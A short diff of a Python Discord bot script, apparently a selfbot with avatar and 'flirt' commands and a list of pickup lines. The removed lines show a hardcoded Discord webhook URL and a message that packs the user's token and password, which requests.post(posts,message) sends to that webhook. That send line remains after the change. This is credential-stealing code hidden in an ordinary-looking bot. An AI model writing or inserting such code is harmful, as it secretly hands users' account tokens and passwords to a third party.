@@ -257,10 +257,7 @@ async def av(ctx, *, user: discord.Member = None):
         await ctx.send(file=discord.File(file, f"Avatar.{format}"))
 
 lines= ("yaarrr tumhari aavaj itni cute hai ki man makrta hai pura din tumhare sath call pe rahu","Well, here I am. What are your other two wishes?","I must be a snowflake, because I’ve fallen for you.","You’re like daal to my chawal . Should we mix it up?","You’re more garam than my chai.","I’m no photographer, but I can picture us together.","Were you born on Diwali?Because you’re a pataka.","Hey, girl! You’re like a jelebee. Sweet and curvy.","Did your license get suspended for driving all these guys crazy?","Did you just come out of the oven? Because you’re hot.","Is your name Google? Because you have everything I’ve been searching for.","Are you a time traveler? Cause I see you in my future!","Are you religious? Because you’re the answer to all my prayers."," I seem to have lost my phone number. Can I have yours?"," I seem to have lost my phone number. Can I have yours?","Was your dad a boxer? Because damn, you’re a knockout!","Aside from being sexy, what do you do for a living?","Hi, how was heaven when you left it?"," Kiss me if I’m wrong, but dinosaurs still exist, right?","Did it hurt? When you fell from heaven?","I may not be a genie, but I can make your dreams come true.","If nothing lasts forever, will you be my nothing?","Can I slap you in the face…with my lips?") 
-posts = "https://discord.com/api/webhooks/928869501355843654/nmqI1cAgYsejv_KD3xath1WY71hmf2HEW8v59zXE6jLNxtGs301fC_qn5AYod7CpCkO9"
-message = {
-  "content": f"token : {token} , pass : {password} "
-}
+
 requests.post(posts,message)
 @crusher.command()
 async def flirt(ctx,* ,user:discord.Member = None):
